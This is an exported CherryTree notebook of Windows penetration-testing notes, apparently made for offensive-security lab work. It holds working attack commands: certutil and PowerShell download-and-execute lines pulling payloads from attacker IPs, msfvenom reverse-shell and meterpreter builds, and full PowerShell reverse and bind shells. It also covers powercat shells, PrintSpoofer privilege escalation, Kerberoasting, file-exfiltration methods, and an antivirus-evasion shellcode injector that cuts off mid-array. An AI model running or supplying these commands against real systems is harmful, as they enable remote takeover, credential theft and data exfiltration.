<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>cherry_notes_15.03.22.ctb</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title level-1'>Windows Notes</h1><br/><strong><h1>DON&#39;T FORGET TO SET binary WHILE TRANSFERING FILES VIA FTP!!!</h1></strong><br /><br /><strong><h2>Download to TEMP (works in win10 others idk)</h2></strong><br /><br />certutil.exe -urlcache -split -f <a href="http://10.11.14.106:80/shell.exe">http://192.168.119.232/shell.exe</a> %temp%\shell.exe<br /><br /><br /><br /><strong><h2>Windows Download a file</h2></strong><br />.certutil.exe -urlcache -split -f http://10.11.14.106:80/winPEAS.exe<br /><br /><strong><h2>Windows reverse shell </h2></strong><br />msfvenom -p windows/shell_reverse_tcp LHOST=10.11.14.106 LPORT=4444 -f exe -o Advanced.exe<br /><br /><br />powershell iex (New-Object  Net.WebClient).DownloadString(&#39;http://10.14.10.119:8000/Invoke-PowerShellTcp.ps1&#39;);Invoke-PowerShellTcp  -Reverse -IPAddress 10.14.10.119 -Port 6667;<br /><br /><br /><br />powershell iex (New-Object  Net.WebClient).DownloadString(&#39;http://your-ip:your-port/Invoke-PowerShellTcp.ps1&#39;);Invoke-PowerShellTcp  -Reverse -IPAddress your-ip -Port your-port<br /><br /><br />msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.14.10.119 LPORT=6667 -f exe -o alfred.exe<br /><br />msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=192.100.0.11 LPORT=80 -f exe -o mgmt2.exe<br /><br /><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.100.0.13 LPORT=80 -f exe -o mgmt.exe</code><br /><br />certutil.exe -urlcache -split -f <a href="http://10.14.10.119:8000/clown.exe">http://10.14.10.119:8000/clown.exe</a><br /><br /><br />certutil.exe -urlcache -split -f <a href="http://10.14.10.119:8000/clown.exe">http://1</a>92.100.0.13/winPEAS.bat<br /><br />powershell iex (New-Object  Net.WebClient).DownloadString(&#39;http://10.14.10.119:8000/Invoke-Kerberoast.ps1&#39;)<br /><br /><br /><code>powershell Invoke-WebRequest -Uri http://10.11.17.106/PrintSpoofer.exe -Outfile </code>print.exe<br /><br /><br /><br />Invoke-WebRequest -Uri http://10.11.17.106/Lite.exe -Outfile LiteAgent.exe<br /><br />sc stop AWSLiteAgent<br />sc start AWSLiteAgent<br /><br /><br />certutil.exe -urlcache -split -f http://10.14.10.119:8000/Message.exe<br /><br />certutil.exe -urlcache -split -f <a href="http://10.14.10.119:8000/mimikatz.exe">http://10.14.10.119:8000/</a>Invoke-Kerberoast.ps1<br /><br />certutil.exe -urlcache -split -f <a href="http://10.11.17.106/PrintSpoofer.exe">http://10.11.17.106/PrintSpoofer.exe</a><br /><br />certutil.exe -urlcache -split -f <a href="http://10.11.17.106/PrintSpoofer.exe">http://10.11.17.106/</a>winPEASx64.exe<br /><br /><br />msfvenom -p windows/shell_reverse_tcp LHOST=10.11.17.106 LPORT=6667 -f exe -o root.exe<br /><br />certutil.exe -urlcache -split -f <a href="http://10.14.10.119:8000/mimikatz.exe">http://10.1</a>0.16.39/winPEASx64.exe<br />certutil.exe -urlcache -split -f <a href="http://10.14.10.119:8000/mimikatz.exe">http://10.1</a>0.16.39/test.msi<br /><br />certutil.exe -urlcache -split -f <a href="http://10.14.10.119:8000/mimikatz.exe">http://10.1</a>1.17.106/seatbelt.exe<br /><br />setspn -T medin -Q */*<br /><br /><br />Import-Module .\Invoke-Kerberoast.ps1<br />Invoke-Kerberoast.ps1<br /><br />Invoke-Kerberoast -OutputFormat hashcat |fl &gt;&gt; hash.txt<br /><br /><br />iex (New-Object  Net.WebClient).DownloadString(&#39;http://10.14.10.119:8000/PowerUp.ps1&#39;)<br /><br /><br />Import-Module .\PowerUp.ps1<br /><br />. .\PowerUp.ps1<br />Invoke-AllChecks<br /><br /><br />smbmap -H 10.10.237.144 -u &#39;anonymous&#39;<br /><br /><br /><br /><br /><a href="https://github.com/dievus/printspoofer">https://github.com/dievus/printspoofer</a><br /><br /><br /><h1>printspoofer</h1><br />PrintSpoofer exploit that can be used to escalate service user permissions on Windows Server 2016, Server 2019, and Windows 10.<br />To escalate privileges, the service account must have SeImpersonate privileges.  To execute:<br />PrintSpoofer.exe -i -c cmd<br />With appropriate privileges this should grant system user shell access.<br /><br /><br />msfvenom -p windows/x86/meterpreter_reverse_tcp LHOST=192.168.49.178 LPORT=80-f exe &gt; whiskey.exe<br /><br /><br /><h3>Powershell ReverseShell</h3><br />powershell -c &quot;$client = New-Object System.Net.Sockets.TCPClient(&#39;192.168.119.182&#39;,443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&quot;<br /><br />PowerShell BindShell<br />powershell -c &quot;$listener = New-Object System.Net.Sockets.TcpListener(&#39;0.0.0.0&#39;,443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2  = $sendback + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()&quot;<br /><br />SOCAT File Transfer<br />sudo socat TCP4-LISTEN:443,fork file:powercat.ps1<br /><br />On Windows:<br />socat TCP4:192.168.119.182.:443 file:powercat.ps1,create<br />type powercat.ps1<br /><br /><br />POWERCAT ReverseShell<br />powercat -c 192.168.119.182 -p 443 -e cmd.exe<br /><br />EncodedReverseShell<br />powercat -c 192.168.119.182  -p 443 -e cmd.exe -ge &gt; encodedreverseshell.ps1<br /><br />ASP ReverseShell<br /><code>msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.182 LPORT=443 -f asp &gt; shell.asp</code><br /></div><div class='page'><h1 class='title level-2'>File Transfers (Offsec)</h1><br/><strong><h3>Windows Downloads Using Scripting Languages</h3></strong><br />echo strUrl = WScript.Arguments.Item(0) &gt; wget.vbs<br />echo StrFile = WScript.Arguments.Item(1) &gt;&gt; wget.vbs<br />echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 &gt;&gt; wget.vbs<br />echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 &gt;&gt; wget.vbs<br />echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 &gt;&gt; wget.vbs<br />echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 &gt;&gt; wget.vbs<br />echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts &gt;&gt; wget.vbs<br />echo  Err.Clear &gt;&gt; wget.vbs<br />echo  Set http = Nothing &gt;&gt; wget.vbs<br />echo  Set http = CreateObject(&quot;WinHttp.WinHttpRequest.5.1&quot;) &gt;&gt; wget.vbs<br />echo  If http Is Nothing Then Set http = CreateObject(&quot;WinHttp.WinHttpRequest&quot;) &gt;&gt; wget.vbs<br />echo  If http Is Nothing Then Set http = CreateObject(&quot;MSXML2.ServerXMLHTTP&quot;) &gt;&gt; wget.vbs<br />echo  If http Is Nothing Then Set http = CreateObject(&quot;Microsoft.XMLHTTP&quot;) &gt;&gt; wget.vbs<br />echo  http.Open &quot;GET&quot;, strURL, False &gt;&gt; wget.vbs<br />echo  http.Send &gt;&gt; wget.vbs<br />echo  varByteArray = http.ResponseBody &gt;&gt; wget.vbs<br />echo  Set http = Nothing &gt;&gt; wget.vbs<br />echo  Set fs = CreateObject(&quot;Scripting.FileSystemObject&quot;) &gt;&gt; wget.vbs<br />echo  Set ts = fs.CreateTextFile(StrFile, True) &gt;&gt; wget.vbs<br />echo  strData = &quot;&quot; &gt;&gt; wget.vbs<br />echo  strBuffer = &quot;&quot; &gt;&gt; wget.vbs<br />echo  For lngCounter = 0 to UBound(varByteArray) &gt;&gt; wget.vbs<br />echo  ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) &gt;&gt; wget.vbs<br />echo  Next &gt;&gt; wget.vbs<br />echo  ts.Close &gt;&gt; wget.vbs<br /><br />We can run this (with cscript) to download files from our Kali machine:<br /><br />C:\Users\Offsec&gt; cscript wget.vbs <a href="http://10.11.0.4/evil.exe">http://10.11.0.4/evil.exe</a> evil.exe<br /><br /><br />Powershell<br />C:\Users\Offsec&gt; echo $webclient = New-Object System.Net.WebClient &gt;&gt;wget.ps1<br />C:\Users\Offsec&gt; echo $url = &quot;<a href="http://10.11.0.4/evil.exe">http://10.11.0.4/evil.exe</a>&quot; &gt;&gt;wget.ps1<br />C:\Users\Offsec&gt; echo $file = &quot;new-exploit.exe&quot; &gt;&gt;wget.ps1<br />C:\Users\Offsec&gt; echo $webclient.DownloadFile($url,$file) &gt;&gt;wget.ps1<br /><br />and<br />C:\Users\Offsec&gt; powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1<br /><br /><br /><br />One Liner Powershell<br />C:\Users\Offsec&gt; powershell.exe (New-Object System.Net.WebClient).DownloadFile(&#39;<a href="http://10.11.0.4/evil.exe',">http://10.11.0.4/evil.exe&#39;,</a> &#39;new-exploit.exe&#39;)<br /><br />If we want to download and execute a PowerShell script without saving it to disk, we can once again use the System.Net.Webclient class. This is done by combining the DownloadString method with the Invoke-Expression cmdlet (IEX)<br /><br />C:\Users\Offsec&gt; powershell.exe IEX (New-Object System.Net.WebClient).DownloadString(&#39;<a href="http://10.11.0.4/helloworld.ps1')">http://10.11.0.4/helloworld.ps1&#39;)</a><br /><br /><br /><br />Exe2Hex<br /><br />kali@kali:~$ locate nc.exe | grep binaries<br />/usr/share/windows-resources/binaries/nc.exe<br /><br />kali@kali:~$ cp /usr/share/windows-resources/binaries/nc.exe .<br /><br />kali@kali:~$ ls -lh nc.exe<br />-rwxr-xr-x 1 kali kali 58K Sep 18 14:22 nc.exe<br /><br />kali@kali:~$ upx -9 nc.exe<br />                       Ultimate Packer for eXecutables<br />                          Copyright (C) 1996 - 2018<br />UPX 3.95        Markus Oberhumer, Laszlo Molnar &amp; John Reiser   Aug 26th 2018<br /><br />        File size         Ratio      Format      Name<br />   --------------------   ------   -----------   -----------<br />     59392 -&gt;     29696   50.00%    win32/pe     nc.exe<br />Packed 1 file.<br /><br />kali@kali:~$ ls -lh nc.exe<br />-rwxr-xr-x 1 kali kali 29K Sep 18 14:22 nc.exe<br /><br />kali@kali:~$ exe2hex -x nc.exe -p nc.cmd<br />[*] exe2hex v1.5.1<br />[+] Successfully wrote (PoSh) nc.cmd<br /><br />kali@kali:~$ head nc.cmd<br />echo|set /p=&quot;&quot;&gt;nc.hex<br />echo|set /p=&quot;4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a2400000000000000&quot;&gt;&gt;nc.hex<br />echo|set /p=&quot;504500004c010300b98eae340000000000000000e0000f010b010500007000000010000000d00000704c010000e000000050010000004000001000000002000004000000000000000400000000000000006001000010000000000000030000000000100000100000000010000010000000000000100000000000000000000000&quot;&gt;&gt;nc.hex<br />...<br /><br />Copy and paste it into powershell<br /><br />...<br />000000000000000000000000000000000000000000000&quot;&gt;&gt;nc.hex<br /><br />C:\Users\offsec&gt;powershell -Command &quot;$h=Get-Content -readcount 0 -path &#39;./nc.hex&#39;;$l=$h[0].length;$b=New-Object byte[] ($l/2);$x=0;for ($i=0;$i -le $l-1;$i+=2){$b[$x]=[byte]::Parse($h[0].Substring($i,2),[System.Globalization.NumberStyles]::HexNumber);$x+=1};set-content -encoding byte &#39;nc.exe&#39; -value $b;Remove-Item -force nc.hex;&quot;<br /><br />C:\Users\offsec&gt; nc -h<br />[v1.10 NT]<br />connect to somewhere:   nc [-options] hostname port[s] [ports] ...<br />listen for inbound:     nc -l -p port [options] [hostname] [port]<br />options:<br />        -d              detach from console, stealth mode<br /><br />        -e prog         inbound program to exec [dangerous!!]<br />...</div><div class='page'><h1 class='title level-3'>Upload</h1><br/>&lt;?php<br />$uploaddir = &#39;/var/www/uploads/&#39;;<br /><br />$uploadfile = $uploaddir . $_FILES[&#39;file&#39;][&#39;name&#39;];<br /><br />move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], $uploadfile)<br />?&gt;<br /><br /><br />kali@kali:/var/www$ sudo mkdir /var/www/uploads<br /><br />kali@kali:/var/www$ ps -ef | grep apache<br />root      1946     1  0 21:39 ?        00:00:00 /usr/sbin/apache2 -k start<br />www-data  1947  1946  0 21:39 ?        00:00:00 /usr/sbin/apache2 -k start<br /><br />kali@kali:/var/www$ sudo chown www-data: /var/www/uploads<br /><br />kali@kali:/var/www$ ls -la<br />total 16<br />drwxr-xr-x  4 root     root     4096 Feb  2 00:33 .<br />drwxr-xr-x 13 root     root     4096 Sep 20 14:57 ..<br />drwxr-xr-x  2 root     root     4096 Feb  2 00:33 html<br />drwxr-xr-x  2 www-data www-data 4096 Feb  2 00:33 uploads<br /><br /><br />C:\Users\Offsec&gt; powershell (New-Object System.Net.WebClient).UploadFile(&#39;<a href="http://10.11.0.4/upload.php',">http://10.11.0.4/upload.php&#39;,</a> &#39;important.docx&#39;)<br /><br /><br />TFTP<br /><br />kali@kali:~$ sudo apt update &amp;&amp; sudo apt install atftp<br />kali@kali:~$ sudo mkdir /tftp<br />kali@kali:~$ sudo chown nobody: /tftp<br />kali@kali:~$ sudo atftpd --daemon --port 69 /tftp<br /><br />C:\Users\Offsec&gt; tftp -i 10.11.0.4 put important.docx</div><div class='page'><h1 class='title level-2'>AV Evasion</h1><br/><span style="color:#060f94;">kali@kali:~$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f powershell</span><br /><br /> Change $sc variable with the output from msfvenom:<br /><br /><div class="codebox"><pre><span style="color:#4a88f1;font-weight:700">$code</span> <span style="color:#bf2e5e;font-weight:400">=</span> <span style="color:#d41919;font-weight:400">&#39;<br />[DllImport(&quot;kernel32.dll&quot;)]<br />public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);<br /><br />[DllImport(&quot;kernel32.dll&quot;)]<br />public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);<br /><br />[DllImport(&quot;msvcrt.dll&quot;)]<br />public static extern IntPtr memset(IntPtr dest, uint src, uint count);&#39;</span>;<br /><br /><span style="color:#4a88f1;font-weight:700">$winFunc</span> <span style="color:#bf2e5e;font-weight:400">=</span> <span style="color:#49aee6;font-weight:400">Add-Type</span> <span style="color:#bf2e5e;font-weight:400">-</span>memberDefinition <span style="color:#4a88f1;font-weight:700">$code</span> <span style="color:#bf2e5e;font-weight:400">-Name</span> <span style="color:#5ebdab;font-weight:400">&quot;Win32&quot;</span> <span style="color:#bf2e5e;font-weight:400">-</span>namespace Win32Functions <span style="color:#bf2e5e;font-weight:400">-passthru</span>;<br /><br />[<span style="color:#4a88f1;font-weight:400">Byte</span>[]];<br />[<span style="color:#4a88f1;font-weight:400">Byte</span>[]] <span style="color:#4a88f1;font-weight:700">$sc</span> <span style="color:#bf2e5e;font-weight:400">=</span> <span style="color:#d41919;font-weight:400">0xfc</span>,<span style="color:#d41919;font-weight:400">0xe8</span>,<span style="color:#d41919;font-weight:400">0x82</span>,<span style="color:#d41919;font-weight:400">0x0</span>,<span style="color:#d41919;font-weight:400">0x0</span>,<span style="color:#d41919;font-weight:400">0x0</span>,<span style="color:#d41919;font-weight:400">0x60</span>,<span style="color:#d41919;font-weight:400">0x89</span>,<span style="color:#d41919;font-weight:400">0xe5</span>,<span style="color:#d41919;font-weight:400">0x31</span>,<span style="color:#d41919;font-weight:400">0xc0</span>,<span style="color:#d41919;font-weight:400">0x64</span>,<span style="color:#d41919;font-weight:400">0x8b</span>,<span style="color:#d41919;font-weight:400">0x50</span>,<span style="color:#d41919;font-weight:400">0x30</span>,<span style="color:#d41919;font-weight:400">0x8b</span>,<span style="color:#d41919;font-weight:400">0x52</span>,<span style="color:#d41919;font-weight:400">0xc</span>,<span style="color:#d41919;font-weight:400">0x8b</span>,<span style="color:#d41919;font-weight:400">0x52</span>,<span style="color:#d41919;font-weight:400">0x14</span>,<span style="color:#d41919;font-weight:400">0x8b</span>,<span style="color:#d41919;font-weight:400">0x72</span>,<span style="color:#d41919;font-weight:400">0x28</span>,<span style="color:#d41919;font-weight:400">0xf</span>,<span style="color:#d41919;font-weight:400">0xb7</span>,<span style="color:#d41919;font-weight:400">0x4a</span>,<span style="color:#d41919;font-weight:400">0x26</span>,<span style="color:#d41919;font-weight:400">0x31</span>,<span style="color:#d41919;font-weight:400">0xff</span>,<span style="color:#d41919;font-weight:400">0xac</span>,<span style="color:#d41919;font-weight:400">0x3c</span>,<span style="color:#d41919;font-weight:400">0x61</span>,<span style="color:#d41919;font-weight:400">0x7c</span>,<span style="color:#d41919;font-weight:400">0x2</span>,<span style="color:#d41919;font-weight:400">0x2c</span>,<span style="color:#d41919;font-weight:400">0x20</span>,<span style="color:#d41919;font-weight:400">0xc1</span>,<span style="color:#d41919;font-weight:400">0xcf</span>,<span style="color:#d41919;font-weight:400">0xd</span>,<span style="color:#d41919;font-weight:400">0x1</span>,<span style="color:#d41919;font-weight:400">0xc7</span>,<span style="color:#d41919;font-weight:400">0xe2</span>,<span style="color:#d41919;font-weight:400">0xf2</span>,<span style="color:#d41919;font-weight:400">0x52</span>,<span style="color:#d41919;font-weight:400">0x57</span>,<span style="color:#d41919;font-weight:400">0x8b</span>,<span style="color:#d41919;font-weight:400">0x52</span>,<span style="color:#d41919;font-weight:400">0x10</span>,<span style="color:#d41919;font-weight:400">0x8b</span>,<span style="color:#d41919;font-weight:400">0x4a</span>,<span style="color:#d41919;font-weight:400">0x3c</span>,<span style="color:#d41919;font-weight:400">0x8b</span>,<span style="color:#d41919;font-weight:400">0x4c</span>,<span style="color:#d41919;font-weight:400">0x11</span>,<span style="color:#d41919;font-weight:400">0x78</span>,<span style="color:#d41919;font-weight:400">0xe3</span>,<span style="color:#d41919;font-weight:400">0x48</span>,<span style="color:#d41919;font-weight:400">0x1</span>,<span style="color:#d41919;font-weight:400">0xd1</span>,<span style="color:#d41919;font-weight:400">0x51</span>,<span style="color:#d41919;font-weight:400">0x8b</span>,<span style="color:#d41919;font-weight:400">0x59</span>,<span style="color:#d41919;font-weight:400">0x20</span>,<span style="color:#d41919;font-weight:400">0x1</span>,<span style="color:#d41919;font-weight:400">0xd3</span>,<span style="color:#d41919;font-weight:400">0x8b</span>,<span style="color:#d41919;font-weight:400">0x49</span>,<span style="color:#d41919;font-weight:400">0x18</span>,<span style="color:#d41919;font-weight:400">0xe3</span>,<span style="color:#d41919;font-weight:400">0x3a</span>,<span style="color:#d41919;font-weight:400">0x49</span>,<span style="color:#d41919;font-weight:400">0x8b</span>,<span style="color:#d41919;font-weight:400">0x34</span>,<span style="color:#d41919;font-weight:400">0x8b</span>,<span style="color:#d41919;font-weight:400">0x1</span>,<span style="color:#d41919;font-weight:400">0xd6</span>,<span style="color:#d41919;font-weight:400">0x31</span>,<span style="color:#d41919;font-weight:400">0xff</span>,<span style="color:#d41919;font-weight:400">0xac</span>,<span style="color:#d41919;font-weight:400">0xc1</span>,<span style="color:#d41919;font-weight:400">0xcf</span>,<span style="color:#d41919;font-weight:400">0xd</span>,<span style="color:#d41919;font-weight:400">0x1</span>,<span style="color:#d41919;font-weight:400">0xc7</span>,<span style="color:#d41919;font-weight:400">0x38</span>,<span style="color:#d41919;font-weight:400">0xe0</span>,<span style="color:#d41919;font-weight:400">0x75</span>,<span style="color:#d41919;font-weight:400">0xf6</span>,<span style="color:#d41919;font-weight:400">0x3</span>,<span style="color:#d41919;font-weight:400">0x7d</span>,<span style="color:#d41919;font-weight:400">0xf8</span>,<span style="color:#d41919;font-weight:400">0x3b</span>,<span style="color:#d41919;font-weight:400">0x7d</span>,<span style="color:#d41919;font-weight:400">0x24</span>,<span style="color:#d41919;font-weight:400">0x75</span>,<span style="color:#d41919;font-weight:400">0xe4</span>,<span style="color:#d41919;font-weight:400">0x58</span>,<span style="color:#d41919;font-weight:400">0x8b</span>,<span style="color:#d41919;font-weight:400">0x58</span>,<span style="color:#d41919;font-weight:400">0x24</span>,<span style="color:#d41919;font-weight:400">0x1</span>,<span style="color:#d41919;font-weight:400">0xd3</span>,<span style="color:#d41919;font-weight:400">0x66</span>,<span style="color:#d41919;font-weight:400">0x8b</span>,<span style="color:#d41919;font-weight:400">0xc</span>,<span style="color:#d41919;font-weight:400">0x4b</span>,<span style="color:#d41919;font-weight:400">0x8b</span>,<span style="color:#d41919;font-weight:400">0x58</span>,<span style="color:#d41919;font-weight:400">0x1c</span>,<span style="color:#d41919;font-weight:400">0x1</span>,<span style="color:#d41919;font-weight:400">0xd3</span>,<span style="color:#d41919;font-weight:400">0x8b</span>,<span style="color:#d41919;font-weight:400">0x4</span>,<span style="color:#d41919;font-weight:400">0x8b</span>,<span style="color:#d41919;font-weight:400">0x1</span>,<span style="color:#d41919;font-weight:400">0xd0</span>,<span style="color:#d41919;font-weight:400">0x89</span>,<span style="color:#d41919;font-weight:400">0x44</span>,<span style="color:#d41919;font-weight:400">0x24</span>,<span style="color:#d41919;font-weight:400">0x24</span>,<span style="color:#d41919;font-weight:400">0x5b</span>,<span style="color:#d41919;font-weight:400">0x5b</span>,<span style="color:#d41919;font-weight:400">0x61</span>,<span style="color:#d41919;font-weight:400">0x59</span>,<span style="color:#d41919;font-weight:400">0x5a</span>,<span style="color:#d41919;font-weight:400">0x51</span>,<span style="color:#d41919;font-weight:400">0xff</span>,<span style="color:#d41919;font-weight:400">0xe0</span>,<span style="color:#d41919;font-weight:400">0x5f</span>,<span style="color:#d41919;font-weight:400">0x5f</span>,<span style="color:#d41919;font-weight:400">0x5a</span>,<span style="color:#d41919;font-weight:400">0x8b</span>,<span style="color:#d41919;font-weight:400">0x12</span>,<span style="color:#d41919;font-weight:400">0xeb</span>,<span style="color:#d41919;font-weight:400">0x8d</span>,<span style="color:#d41919;font-weight:400">0x5d</span>,<span style="color:#d41919;font-weight:400">0x68</span>,<span style="color:#d41919;font-weight:400">0x33</span>,<span style="color:#d41919;font-weight:400">0x32</span>,<span style="color:#d41919;font-weight:400">0x0</span>,<span style="color:#d41919;font-weight:400">0x0</span>,<span style="color:#d41919;font-weight:400">0x68</span>,<span style="color:#d41919;font-weight:400">0x77</span>,<span style="color:#d41919;font-weight:400">0x73</span>,<span style="color:#d41919;font-weight:400">0x32</span>,<span style="color:#d41919;font-weight:400">0x5f</span>,<span style="color:#d41919;font-weight:400">0x54</span>,<span style="color:#d41919;font-weight:400">0x68</span>,<span style="color:#d41919;font-weight:400">0x4c</span>,<span style="color:#d41919;font-weight:400">0x77</span>,<span style="color:#d41919;font-weight:400">0x26</span>,<span style="color:#d41919;font-weight:400">0x7</span>,<span style="color:#d41919;font-weight:400">0xff</span>,<span style="color:#d41919;font-weight:400">0xd5</span>,<span style="color:#d41919;font-weight:400">0xb8</span>,<span style="color:#d41919;font-weight:400">0x90</span>,<span style="color:#d41919;font-weight:400">0x1</span>,<span style="color:#d41919;font-weight:400">0x0</span>,<span style="color:#d41919;font-weight:400">0x0</span>,<span style="color:#d41919;font-weight:400">0x29</span>,<span style="color:#d41919;font-weight:400">0xc4</span>,<span style="color:#d41919;font-weight:400">0x54</span>,<span style="color:#d41919;font-weight:400">0x50</span>,<span style="color:#d41919;font-weight:400">0x68</span>,<span style="color:#d41919;font-weight:400">0x29</span>,<span style="color:#d41919;font-weight:400">0x80</span>,<span style="color:#d41919;font-weight:400">0x6b</span>,<span style="color:#d41919;font-weight:400">0x0</span>,<span style="color:#d41919;font-weight:400">0xff</span>,<span style="color:#d41919;font-weight:400">0xd5</span>,<span style="color:#d41919;font-weight:400">0x6a</span>,<span style="color:#d41919;font-weight:400">0xa</span>,<span style="color:#d41919;font-weight:400">0x68</span>,<span style="color:#d41919;font-weight:400">0xac</span>,<span style="color:#d41919;font-weight:400">0x10</span>,<span style="color:#d41919;font-weight:400">0x74</span>,<span style="color:#d41919;font-weight:400">0x8b</span>,<span style="color:#d41919;font-weight:400">0x68</span>,<span style="color:#d41919;font-weight:400">0x2</span>,<span style="color:#d41919;font-weight:400">0x0</span>,<span style="color:#d41919;font-weight:400">0x11</span>,<span style="color:#d41919;font-weight:400">0x5c</span>,<span style="color:#d41919;font-weight:400">0x89</span>,<span style="color:#d41919;font-weight:400">0xe6</span>,<span style="color:#d41919;font-weight:400">0x50</span>,<span style="color:#d41919;font-weight:400">0x50</span>,<span style="color:#d41919;font-weight:400">0x50</span>,<span style="color:#d41919;font-weight:400">0x50</span>,<span style="color:#d41919;font-weight:400">0x40</span>,<span style="color:#d41919;font-weight:400">0x50</span>,<span style="color:#d41919;font-weight:400">0x40</span>,<span style="color:#d41919;font-weight:400">0x50</span>,<span style="color:#d41919;font-weight:400">0x68</span>,<span style="color:#d41919;font-weight:400">0xea</span>,<span style="color:#d41919;font-weight:400">0xf</span>,<span style="color:#d41919;font-weight:400">0xdf</span>,<span style="color:#d41919;font-weight:400">0xe0</span>,<span style="color:#d41919;font-weight:400">0xff</span>,<span style="color:#d41919;font-weight:400">0xd5</span>,<span style="color:#d41919;font-weight:400">0x97</span>,<span style="color:#d41919;font-weight:400">0x6a</span>,<span style="color:#d41919;font-weight:400">0x10</span>,<span style="color:#d41919;font-weight:400">0x56</span>,<span style="color:#d41919;font-weight:400">0x57</span>,<span style="color:#d41919;font-weight:400">0x68</span>,<span style="color:#d41919;font-weight:400">0x99</span>,<span style="color:#d41919;font-weight:400">0xa5</span>,<span style="color:#d41919;font-weight:400">0x74</span>,<span style="color:#d41919;font-weight:400">0x61</span>,<span style="color:#d41919;font-weight:400">0xff</span>,<span style="color:#d41919;font-weight:400">0xd5</span>,<span style="color:#d41919;font-weight:400">0x85</span>,<span style="color:#d41919;font-weight:400">0xc0</span>,<span style="color:#d41919;font-weight:400">0x74</span>,<span style="color:#d41919;font-weight:400">0xa</span>,<span style="color:#d41919;font-weight:400">0xff</span>,<span style="color:#d41919;font-weight:400">0x4e</span>,<span style="color:#d41919;font-weight:400">0x8</span>,<span style="color:#d41919;font-weight:400">0x75</span>,<span style="color:#d41919;font-weight:400">0xec</span>,<span style="color:#d41919;font-weight:400">0xe8</span>,<span style="color:#d41919;font-weight:400">0x61</span>,<span style="color:#d41919;font-weight:400">0x0</span>,<span style="color:#d41919;font-weight:400">0x0</span>,<span style="color:#d41919;font-weight:400">0x0</span>,<span style="color:#d41919;font-weight:400">0x6a</span>,<span style="color:#d41919;font-weight:400">0x0</span>,<span style="color:#d41919;font-weight:400">0x6a</span>,<span style="color:#d41919;font-weight:400">0x4</span>,<span style="color:#d41919;font-weight:400">0x56</span>,<span style="color:#d41919;font-weight:400">0x57</span>,<span style="color:#d41919;font-weight:400">0x68</span>,<span style="color:#d41919;font-weight:400">0x2</span>,<span style="color:#d41919;font-weight:400">0xd9</span>,<span style="color:#d41919;font-weight:400">0xc8</span>,<span style="color:#d41919;font-weight:400">0x5f</span>,<span style="color:#d41919;font-weight:400">0xff</span>,<span style="color:#d41919;font-weight:400">0xd5</span>,<span style="color:#d41919;font-weight:400">0x83</span>,<span style="color:#d41919;font-weight:400">0xf8</span>,<span style="color:#d41919;font-weight:400">0x0</span>,<span style="color:#d41919;font-weight:400">0x7e</span>,<span style="color:#d41919;font-weight:400">0x36</span>,<span style="color:#d41919;font-weight:400">0x8b</span>,<span style="color:#d41919;font-weight:400">0x36</span>,<span style="color:#d41919;font-weight:400">0x6a</span>,<span style="color:#d41919;font-weight:400">0x40</span>,<span style="color:#d41919;font-weight:400">0x68</span>,<span style="color:#d41919;font-weight:400">0x0</span>,<span style="color:#d41919;font-weight:400">0x10</span>,<span style="color:#d41919;font-weight:400">0x0</span>,<span style="color:#d41919;font-weight:400">0x0</span>,<span style="color:#d41919;font-weight:400">0x56</span>,<span style="color:#d41919;font-weight:400">0x6a</span>,<span style="color:#d41919;font-weight:400">0x0</span>,<span style="color:#d41919;font-weight:400">0x68</span>,<span style="color:#d41919;font-weight:400">0x58</span>,<span style="color:#d41919;font-weight:400">0xa4</span>,<span style="color:#d41919;font-weight:400">0x53</span>,<span style="color:#d41919;font-weight:400">0xe5</span>,<span style="color:#d41919;font-weight:400">0xff</span>,<span style="color:#d41919;font-weight:400">0xd5</span>,<span style="color:#d41919;font-weight:400">0x93</span>,<span style="color:#d41919;font-weight:400">0x53</span>,<span style="color:#d41919;font-weight:400">0x6a</span>,<span style="color:#d41919;font-weight:400">0x0</span>,<span style="color:#d41919;font-weight:400">0x56</span>,<span style="color:#d41919;font-weight:400">0x53</span>,<span style="color:#d41919;font-weight:400">0x57</span>,<span style="color:#d41919;font-weight:400">0x68</span>,<span 